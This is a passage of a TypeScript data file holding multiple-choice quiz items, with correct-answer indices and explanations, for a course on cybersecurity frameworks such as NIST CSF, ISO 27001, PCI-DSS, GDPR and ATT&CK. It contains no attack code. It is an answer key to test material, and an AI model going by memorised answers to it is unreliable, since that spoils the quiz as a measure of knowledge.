        correctAnswer: 1,
        explanation: "A unified control catalog documents each control with mappings to all applicable frameworks (NIST CSF, ISO 27001, CIS, PCI-DSS, etc.)."
      },
      {
        id: "cf-q9-9",
        question: "Which GRC tool automates framework cross-mapping?",
        options: [
          "Microsoft Excel, requiring manual input and cell formula configurations.",
          "Compliance automation platforms like Drata, Vanta, or OneTrust.",
          "Notepad, used to edit raw text checklists and policy files offline.",
          "Wireshark, designed to parse network packets and capture credentials."
        ],
        correctAnswer: 1,
        explanation: "GRC tools like Drata, Vanta, and OneTrust automate cross-framework mapping and centralize compliance management."
      },
      {
        id: "cf-q9-10",
        question: "How does D3FEND complement ATT&CK?",
        options: [
          "It completely replaces the ATT&CK framework for offensive operations testing.",
          "It maps defensive countermeasures directly to ATT&CK offensive threat techniques.",
          "It is identical to the ATT&CK framework but published under a different agency.",
          "It works exclusively for network firewalls, ignoring endpoint threat techniques."
        ],
        correctAnswer: 1,
        explanation: "D3FEND provides the defensive counterpart — for each ATT&CK offensive technique, D3FEND lists specific countermeasures."
      },
      {
        id: "cf-q9-11",
        question: "What should be the first step in building a unified control framework?",
        options: [
          "Purchasing an expensive enterprise GRC tool before defining security policies.",
          "Selecting a primary framework (like NIST CSF or ISO 27001) as the baseline.",
          "Hiring an external consulting group to write all controls from default templates.",
          "Implementing every security control immediately across all network segments."
        ],
        correctAnswer: 1,
        explanation: "The first step is choosing a primary framework (usually NIST CSF or ISO 27001) as the foundation to map all others against."
      },
      {
        id: "cf-q9-12",
        question: "Which framework requirement is unique to GDPR and doesn't overlap with others?",
        options: [
          "Maintaining an active inventory of physical and logical corporate IT assets.",
          "Conducting mandatory Data Protection Impact Assessments (DPIAs) for risky data.",
          "Enforcing access control restrictions based on business need to know.",
          "Establishing incident response procedures and playbooks for database breaches."
        ],
        correctAnswer: 1,
        explanation: "DPIAs are a GDPR-specific requirement that doesn't directly overlap with PCI-DSS, SOC 2, or CIS Controls."
      },
      {
        id: "cf-q9-13",
        question: "What ATT&CK coverage score means high-fidelity detection with automated response?",
        options: [
          "Score 1, indicating basic raw log ingestion without parsing or search indexes.",
          "Score 2, representing parsed logs that analysts can search manually during triage.",
          "Score 3, indicating high-fidelity detection rules with automated response playbooks.",
          "Score 4, representing complete theoretical immunity to the adversary technique."
        ],
        correctAnswer: 2,
        explanation: "Score 3 indicates high-fidelity detection with automated response capabilities for an ATT&CK technique."
      },
      {
        id: "cf-q9-14",
        question: "How should gaps in ATT&CK coverage be prioritized?",
        options: [
          "Addressing all identified gaps simultaneously using a chronological queue.",
          "Prioritizing gaps based on threat prevalence, potential impact, and feasibility.",
          "Only addressing Tier 1 network perimeter gaps, ignoring host endpoints.",
          "Ignoring the gaps entirely until an active breach forces remediation."
        ],
        correctAnswer: 1,
        explanation: "Prioritize gaps based on how frequently threat actors use the technique, the potential impact, and the cost/feasibility of implementing detection."
      },
      {
        id: "cf-q9-15",
        question: "What does a D3FEND knowledge graph connect?",
        options: [
          "Only offensive exploits and malware families found on public threat feeds.",
          "Digital artifacts, defensive techniques, offensive techniques, and technologies.",
          "Employee user profiles and their corresponding authorization access lists.",
          "Physical network devices, server racks, and cabling layouts in data centers."
        ],
        correctAnswer: 1,
        explanation: "The D3FEND knowledge graph connects digital artifacts, offensive techniques, defensive countermeasures, and implementing technologies."
      }
    ]
  },
  {
    quizId: "cf-q10",
    courseId: "cybersecurity-frameworks",
    title: "Cybersecurity Frameworks Certification Exam",
    description: "Comprehensive final exam covering all 10 modules. Pass with 80% to earn your certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      {
        id: "cf-q10-1",
        question: "What is the primary purpose of cybersecurity governance?",
        options: [
          "Continuous network traffic monitoring and automated threat blocking protocols.",
          "Aligning security with business strategy, managing risks, and ensuring accountability.",
          "Writing secure source code for internal web applications and databases.",
          "Securing physical facilities, server rooms, and verifying employee badges."
        ],
        correctAnswer: 1,
        explanation: "Governance ensures security efforts strategically support business objectives with clear accountability and oversight."
      },
      {
        id: "cf-q10-2",
        question: "How many core functions does NIST CSF v2.0 have?",
        options: [
          "The framework defines 4 core functions focusing on technical controls.",
          "The framework contains 5 core functions identical to the 1.1 standard draft.",
          "The framework has 6 core functions: Govern, Identify, Protect, Detect, Respond, and Recover.",
          "The framework establishes 8 functions covering all quantitative risk modeling."
        ],
        correctAnswer: 2,
        explanation: "NIST CSF v2.0 has 6 functions: Govern, Identify, Protect, Detect, Respond, and Recover."
      },
      {
        id: "cf-q10-3",
        question: "Which framework offers formal third-party certification?",
        options: [
          "NIST CSF, which is a voluntary risk-based framework for private organizations.",
          "CIS Controls, which provides prescriptive technical baseline hardening guides.",
          "ISO 27001, which allows organizations to achieve accredited certification.",
          "MITRE ATT&CK, which catalogs real-world adversary tactics and techniques."
        ],
        correctAnswer: 2,
        explanation: "ISO 27001 is the only major cybersecurity framework offering formal third-party certification."
      },
      {
        id: "cf-q10-4",
        question: "What is IG1 in CIS Controls?",
        options: [
          "Internet Gateway 1 — a perimeter routing policy for branch offices.",
          "Implementation Group 1, representing Essential Cyber Hygiene baseline safeguards.",
          "Investigation Group 1 — a forensic category for small incident triage.",
          "Incident Grade 1, indicating a low-severity threat in the SIEM queue."
        ],
        correctAnswer: 1,
        explanation: "IG1 is Essential Cyber Hygiene — 56 foundational safeguards protecting against ~77% of common ATT&CK techniques."
      },
      {
        id: "cf-q10-5",
        question: "What formula calculates Annualized Loss Expectancy?",
        options: [
          "ALE = SLE + ARO, summing single loss expectancy and annualized occurrence rate.",
          "ALE = SLE * ARO, multiplying Single Loss Expectancy by Annualized Rate of Occurrence.",
          "ALE = SLE / ARO, dividing expected loss by the annual rate of occurrence.",
          "ALE = SLE - ARO, subtracting occurrence rate from the single loss expectancy."
        ],
        correctAnswer: 1,
        explanation: "ALE = SLE (Single Loss Expectancy) × ARO (Annualized Rate of Occurrence) is the core quantitative risk formula."
      },
      {
        id: "cf-q10-6",
        question: "Which PCI-DSS data element must never be stored after authorization?",
        options: [
          "The customer's cardholder name, printed on the front of the credit card.",
          "Primary Account Number (PAN), which must be encrypted if stored long-term.",
          "Card Verification Value (CVV/CVC) code, used for card-not-present transactions.",
          "The card's expiration date, printed as month and year in numerical format."
        ],
        correctAnswer: 2,
        explanation: "CVV/CVC, full track data, and PINs must never be stored after transaction authorization."
      },
      {
        id: "cf-q10-7",
        question: "Within how many hours must a GDPR breach be reported?",
        options: [
          "Notifications must be submitted within 24 hours of finding indicators of compromise.",
          "Notifications must be submitted within 48 hours of escalating the case to Tier 2.",
          "Notifications must be submitted within 72 hours of becoming aware of the breach.",
          "Notifications must be submitted within 96 hours of completing database containment."
        ],
        correctAnswer: 2,
        explanation: "GDPR requires breach notification to the supervisory authority within 72 hours."
      },
      {
        id: "cf-q10-8",
        question: "Which SOC 2 TSC is always mandatory?",
        options: [
          "Availability criteria, verifying system redundancy and backup schedules.",
          "Privacy criteria, validating compliance with consumer data regulations.",
          "Security (Common Criteria), which must be included in every SOC 2 report.",
          "Processing Integrity, ensuring systems process transactions without errors."
        ],
        correctAnswer: 2,
        explanation: "Security (Common Criteria) is always required in every SOC 2 report."
      },
      {
        id: "cf-q10-9",
        question: "What are the four risk treatment strategies?",
        options: [
          "Plan the mitigation, Do the changes, Check the logs, and Act to enforce.",
          "Mitigate the risk, Transfer the risk, Avoid the risk, and Accept the risk.",
          "Identify the assets, Protect the systems, Detect the threats, and Respond.",
          "Harden the systems, Detect anomalies, Isolate the host, and Evict threats."
        ],
        correctAnswer: 1,
        explanation: "The four risk treatment strategies are Mitigate, Transfer, Avoid, and Accept."
      },
      {
        id: "cf-q10-10",
        question: "What does the shared responsibility model define in cloud computing?",
        options: [
          "How cloud computing costs and licensing rates are shared among business departments.",
          "The division of security responsibilities between the cloud provider and customer.",
          "The scheduling of shared physical workspace and desk usage in co-working offices.",
          "How developers share administrative passwords and access keys inside teams."
        ],
        correctAnswer: 1,
        explanation: "The shared responsibility model defines what the cloud provider secures vs. what the customer secures."
      },
      {
        id: "cf-q10-11",
        question: "How many Annex A controls does ISO 27001:2022 have?",
        options: [
          "ISO 27001 defines 42 controls focused exclusively on IT infrastructure configurations.",
          "ISO 27001 consists of 93 controls organized into 4 themes in the 2022 update.",
          "ISO 27001 includes 114 controls, which is the baseline of the legacy 2013 standard.",
          "ISO 27001 mandates 200 controls covering physical, technological, and accounting rules."
        ],
        correctAnswer: 1,
        explanation: "ISO 27001:2022 has 93 controls organized into 4 themes (reduced from 114 in the 2013 version)."
      },
      {
        id: "cf-q10-12",
        question: "What HIPAA document must vendors handling ePHI sign?",
        options: [
          "Non-Disclosure Agreement (NDA), protecting corporate secrets and database structures.",
          "Business Associate Agreement (BAA), which defines security obligations for ePHI.",
          "Employment contract, outlining salary details and human resource policies.",
          "Privacy notice, describing how customer data is processed on standard websites."
        ],
        correctAnswer: 1,
        explanation: "A BAA is legally required for all business associates handling ePHI."
      },
      {
        id: "cf-q10-13",
        question: "What is the ATT&CK Navigator used for?",
        options: [
          "Routing local network packets between segmented VLAN configurations.",
          "Creating visual heatmaps of control coverage across threat tactics and techniques.",
          "Mapping GPS locations of corporate servers and network infrastructure hubs.",
          "Navigating source code trees in large software repositories and platforms."
        ],
        correctAnswer: 1,
        explanation: "The ATT&CK Navigator creates heatmaps showing detection/prevention coverage across all ATT&CK techniques."
      },
      {
        id: "cf-q10-14",
        question: "What is NIST CSF Tier 4 called?",
        options: [
          "Partial, indicating informal and ad-hoc risk management processes are used.",
          "Risk Informed, where practices are approved but not integrated organization-wide.",
          "Repeatable, indicating formal policy and structured, repeatable processes.",
          "Adaptive, indicating continuous improvement and threat-informed practices."
        ],
        correctAnswer: 3,
        explanation: "Tier 4: Adaptive — risk management is part of organizational culture with continuous, data-driven improvement."
      },
      {
        id: "cf-q10-15",
        question: "What percentage of breaches involve third parties?",
        options: [
          "Approximately 20% of verified breaches are linked directly to vendor compromises.",
          "Approximately 40% of incidents involve external API integrations or servers.",
          "Approximately 60% of data breaches involve third-party access or vendor software.",
          "Approximately 80% of data leakages occur through supply chain service providers."
        ],
        correctAnswer: 2,
        explanation: "Approximately 60% of data breaches involve a third party (Ponemon Institute)."
      },
      {
        id: "cf-q10-16",
        question: "What is the CCPA revenue threshold?",
        options: [
          "Annual gross revenues exceeding $10 million, irrespective of other criteria.",
          "Annual gross revenues exceeding $25 million, establishing CCPA applicability.",
          "Annual gross revenues exceeding $50 million, covering large digital service hosts.",
          "Annual gross revenues exceeding $100 million, targeting global conglomerates."
        ],
        correctAnswer: 1,
        explanation: "CCPA applies to businesses with annual gross revenue over $25 million."
      },
      {
        id: "cf-q10-17",
        question: "What does D3FEND provide?",
        options: [
          "A comprehensive catalog of offensive hacking exploits and malware techniques.",
          "A knowledge base of cybersecurity countermeasures mapped to ATT&CK techniques.",
          "Formal compliance certifications for cloud infrastructure and SaaS products.",
          "Continuous network security monitoring and deep packet capture tools."
        ],
        correctAnswer: 1,
        explanation: "D3FEND provides a knowledge base of cybersecurity countermeasures organized by their relationship to ATT&CK techniques."
      },
      {
        id: "cf-q10-18",
        question: "What is a Statement of Applicability (SoA)?",
        options: [
          "A standard template used when applying for entry-level security jobs.",
          "A document listing all ISO 27001 controls with applicability and justification.",
          "A vendor SLA contract defining database response times and performance goals.",
          "A qualitative risk assessment matrix used during threat modeling sessions."
        ],
        correctAnswer: 1,
        explanation: "The SoA is the most critical ISO 27001 document listing all 93 controls with whether each is applicable and why."
      },
      {
        id: "cf-q10-19",
        question: "Which STRIDE category relates to unauthorized access elevation?",
        options: [
          "Spoofing, which involves impersonating a legitimate user or system identity.",
          "Tampering, which covers unauthorized modification of database records or files.",
          "Repudiation, where an attacker denies performing a specific action or transaction.",
          "Elevation of Privilege, where an attacker gains access rights above their level."
        ],
        correctAnswer: 3,
        explanation: "Elevation of Privilege in STRIDE refers to gaining unauthorized access rights above what was granted."
      },
      {
        id: "cf-q10-20",
        question: "What is continuous compliance?",
        options: [
          "Conducting intense audit preparation during the week preceding the assessment.",
          "Automated, ongoing monitoring of security controls replacing point-in-time audits.",
          "Scheduling weekly compliance meetings to discuss policy updates and checklists.",
          "Collecting evidence manually by taking screenshots of server settings quarterly."
        ],
        correctAnswer: 1,
        explanation: "Continuous compliance uses automated tools for ongoing control monitoring and evidence collection, replacing annual audit scrambles."
      },
      {
        id: "cf-q10-21",
        question: "How many PCI-DSS requirements are there?",
        options: [
          "The standard defines 6 high-level goals for payment infrastructure security.",
          "The standard contains 10 operational compliance checks for merchant databases.",
          "The standard consists of 12 detailed requirements organized into six goals.",
          "The standard mandates 15 technical guidelines for card reader software codes."
        ],
        correctAnswer: 2,
        explanation: "PCI-DSS has 12 requirements organized into 6 goals."
      },
      {
        id: "cf-q10-22",
        question: "What is the PDCA cycle in ISO 27001?",
        options: [
          "Protect the databases, Detect the threat, Contain host, and Analyze impact.",
          "Plan the security, Do the controls, Check effectiveness, and Act to improve.",
          "Prepare system configurations, Deploy patches, Control access, and Audit log files.",
          "Prevent external access, Discover system bugs, Correct issues, and Adapt rules."
        ],
        correctAnswer: 1,
        explanation: "Plan-Do-Check-Act is the continuous improvement cycle that ISO 27001 is built upon."
      },
      {
        id: "cf-q10-23",
        question: "What is the main benefit of cross-framework mapping?",
        options: [
          "It adds complexity and increases the work required to pass annual compliance.",
          "One well-implemented control satisfies multiple framework requirements simultaneously.",
          "It eliminates all security frameworks, replacing them with a custom corporate guide.",
          "It significantly increases the time and costs associated with external audits."
        ],
        correctAnswer: 1,
        explanation: "Cross-mapping shows one control can satisfy multiple framework requirements simultaneously, reducing effort and cost."
      },
      {
        id: "cf-q10-24",
        question: "What HIPAA breach size triggers media notification?",
        options: [
          "Any unauthorized exposure of PHI, regardless of the number of patient records.",
          "A breach affecting 100 or more patient files, reported within 30 days of discovery.",
          "A breach affecting 500 or more individuals in a single state or jurisdiction.",
          "A breach affecting 1,000 or more files, requiring national news broadcast."
        ],
        correctAnswer: 2,
        explanation: "HIPAA requires media notification when a breach affects 500+ individuals in a single state or jurisdiction."
      },
      {
        id: "cf-q10-25",
        question: "Which metric measures how quickly threats are identified?",
        options: [
          "Mean Time to Respond (MTTR), tracking containment and system recovery actions.",
          "Mean Time to Detect (MTTD), measuring the average time to identify a threat.",
          "Mean Time to Contain (MTTC), measuring host isolation and firewall blocks.",
          "Mean Time to Fail (MTTF), calculating hardware lifecycle and reliability rates."
        ],
        correctAnswer: 1,
        explanation: "MTTD (Mean Time to Detect) measures the average time to identify a security threat."
      },
      {
        id: "cf-q10-26",
        question: "What is residual risk?",
        options: [
          "The initial risk score before any mitigation controls are implemented.",
          "The risk remaining after security controls and treatment measures are applied.",
          "The threat vector that was completely eliminated by decommissioning hosts.",
          "The baseline risk score provided by standard vulnerability scanning tools."
        ],
        correctAnswer: 1,
        explanation: "Residual risk is what remains after controls are implemented — it must fall within the organization's risk appetite."
      },
      {
        id: "cf-q10-27",
        question: "What are CIS Benchmarks?",
        options: [
          "General security guidelines and high-level strategical frameworks for executives.",
          "Prescriptive, technology-specific configuration hardening guides.",
          "Marketing indices comparing IT budget distribution across sectors.",
          "Performance benchmark tools that measure server network speed stats."
        ],
        correctAnswer: 1,
        explanation: "CIS Benchmarks are detailed, step-by-step hardening guides specifying exact configuration settings for specific platforms."
      },
      {
        id: "cf-q10-28",
        question: "In NIST RMF, what is the output of the Authorize step?",
        options: [
          "A raw vulnerability scan report detailing missing OS patches across servers.",
          "An Authorization to Operate (ATO) decision signed by a senior official.",
          "A complete network topology diagram mapping all active logical segments.",
          "A certificate verifying that all system users completed security training."
        ],
        correctAnswer: 1,
        explanation: "The Authorize step results in an ATO decision — a senior official's risk-based approval for a system to operate."
      },
      {
        id: "cf-q10-29",
        question: "What GDPR principle states you should collect only necessary data?",
        options: [
          "Accuracy, ensuring all stored personal records are kept correct and updated.",
          "Purpose Limitation, restricting data usage to the reasons specified to users.",
          "Data Minimization, mandating that only necessary data is collected for the task.",
          "Storage Limitation, requiring deletion of records after the purpose is achieved."
        ],
        correctAnswer: 2,
        explanation: "Data Minimization is the principle that organizations should collect only the personal data necessary for the specified purpose."
      },
      {
        id: "cf-q10-30",
        question: "What certification is recommended for GRC career advancement?",
        options: [
          "AWS Certified Solutions Architect, validating cloud infrastructure design skills.",
          "CISA (Certified Information Systems Auditor) from ISACA for audit roles.",
          "Project Management Professional (PMP), focused on team workflows and budgets.",
          "Cisco Certified Network Associate (CCNA), covering routing and switching rules."
        ],
        correctAnswer: 1,
        explanation: "CISA from ISACA is one of the most valued certifications for GRC professionals, covering audit, compliance, and governance."
      }
    ]
  },
];

export const getQuizById = (courseId: string, quizId: string): QuizData | undefined => {
  return quizzes.find(q => q.courseId === courseId && q.quizId === quizId);
};

export const getCourseQuizzes = (courseId: string): QuizData[] => {
  return quizzes.filter(q => q.courseId === courseId);
};
